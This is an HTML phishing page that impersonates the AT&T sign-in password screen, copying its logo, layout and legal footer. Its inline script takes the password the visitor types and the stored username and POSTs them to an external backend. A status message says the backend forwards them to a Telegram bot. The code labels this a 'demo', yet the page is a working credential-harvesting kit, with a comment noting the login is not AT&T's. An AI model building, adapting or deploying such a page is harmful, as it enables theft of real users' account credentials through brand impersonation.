<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AT&T Sign In - Password</title>
    <link rel="stylesheet" href="welcome.css">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Segoe+UI:wght@400;600;700&display=swap" rel="stylesheet">
</head>
<body>

<div class="page-wrapper">
    <!-- Main Sign-In Card -->
    <div class="auth-card">
        
        <!-- Brand Header Layout -->
        <div class="brand-header">
            <!-- Inline SVG replacement placeholder for AT&T logo graphics -->
          
        
            <img src="https://res.cloudinary.com/djme9spdc/image/upload/v1785666877/download_nocdzw.svg" height="40px" width="120px">
        </div>


        <h1>Welcome</h1>

        <!-- Back Button & Selected Username Display -->
        <div class="identity-badge">
            <button type="button" class="back-arrow" aria-label="Go back to username entry">
                <svg viewBox="0 0 24 24" width="20" height="20" fill="currentColor">
                    <path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/>
                </svg>
            </button>
            <span class="username-display" id="username-display">234.565.4</span>
        </div>

        <!-- Form Layout Element -->
        <form class="login-form" onsubmit="event.preventDefault();">
            
            <!-- Password Container with Inline Text Button -->
            <div class="input-container">
                <label for="password">Password</label>
                <div class="password-wrapper">
                    <input type="password" id="password" required>
                    <button type="button" id="toggle-password" class="show-hide-btn">Show</button>
                </div>
            </div>

            <!-- Keep me signed in Checkbox -->
            <div class="checkbox-container">
                <input type="checkbox" id="keep-signed-in">
                <label for="keep-signed-in">Keep me signed in</label>
            </div>

            <button type="submit" class="btn btn-primary">Sign in</button>
        </form>

        <!-- Contextual Help Links -->
        <div class="links-container">
            <a href="#" class="action-link text-bold">Forgot password?</a>
            <a href="#" class="action-link text-bold">Pay without signing in</a>
        </div>

        <!-- Section Break / Divider Line -->
        <div class="separator-bar">
            <span>OR</span>
        </div>

        <!-- Alternative Access Operations -->
        <button type="button" class="btn btn-secondary">Sign in with the AT&T app</button>

    </div>

    <!-- Outer Page Utilities Footer Layout -->
    <footer class="page-footer">
        <div class="footer-nav">
            <a href="#">Legal policy center</a>
            <a href="#">Privacy policy</a>
            <a href="#">Terms of use</a>
            <a href="#">Accessibility</a>
            <a href="#" class="privacy-choice">
                <svg viewBox="0 0 30 14" width="26" height="12" fill="none" style="vertical-align: middle; margin-right: 4px;">
                    <rect width="30" height="14" rx="7" fill="#313131"/>
                    <circle cx="7" cy="7" r="5" fill="#fff"/>
                    <path d="M18 4l3 3 5-5" stroke="#fff" stroke-width="2"/>
                </svg>
                Your privacy choices
            </a>
            <a href="#">Screen share code</a>
        </div>
        <p class="copyright">©2026 AT&T Intellectual Property. All rights reserved.</p>
    </footer>
</div>

<script src="config.js"></script>
<script>
    // Handle inline password toggle feature
    const passwordInput = document.getElementById('password');
    const toggleButton = document.getElementById('toggle-password');

    toggleButton.addEventListener('click', function() {
        if (passwordInput.type === 'password') {
            passwordInput.type = 'text';
            toggleButton.textContent = 'Hide';
        } else {
            passwordInput.type = 'password';
            toggleButton.textContent = 'Show';
        }
    });

    // Login NOT AT&T
    // Populate the username display from the User ID entered on the previous page.
    // Priority: URL query parameter (?username=...) > sessionStorage > hardcoded fallback.
    const usernameDisplay = document.getElementById('username-display');
    if (usernameDisplay) {
        const urlParams = new URLSearchParams(window.location.search);
        const urlUsername = urlParams.get('username');
        const storedUsername = sessionStorage.getItem('att_username');

        const realUsername = (urlUsername && urlUsername.trim()) ? urlUsername.trim() : storedUsername;
        usernameDisplay.textContent = realUsername || '234.565.4';
    }

    // Send the entered credentials to the Telegram demo bot when signing in.
    const signInBtn = document.querySelector('.btn-primary');
    signInBtn.addEventListener('click', async function () {
        const username = sessionStorage.getItem('att_username') || 'unknown@att.demo';
        const password = passwordInput.value.trim();

        if (!password) {
            alert('Please enter a password .');
            return;
        }

        const originalText = signInBtn.textContent;
        signInBtn.textContent = 'Sending demo credentials...';

        try {
            const response = await fetch(window.API_BASE_URL + '/api/demo-submit', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ username: username, password: password })
            });

            const result = await response.json();

            if (response.ok) {
                signInBtn.textContent = '✅ Demo sent to Telegram!';
                passwordInput.value = '';
            } else {
                signInBtn.textContent = 'Backend error: ' + (result.message || 'Unknown error');
            }
        } catch (err) {
            signInBtn.textContent = 'Could not reach the backend (php artisan serve).';
        }

        setTimeout(function () { signInBtn.textContent = originalText; }, 3000);
    });
</script>

</body>
</html>
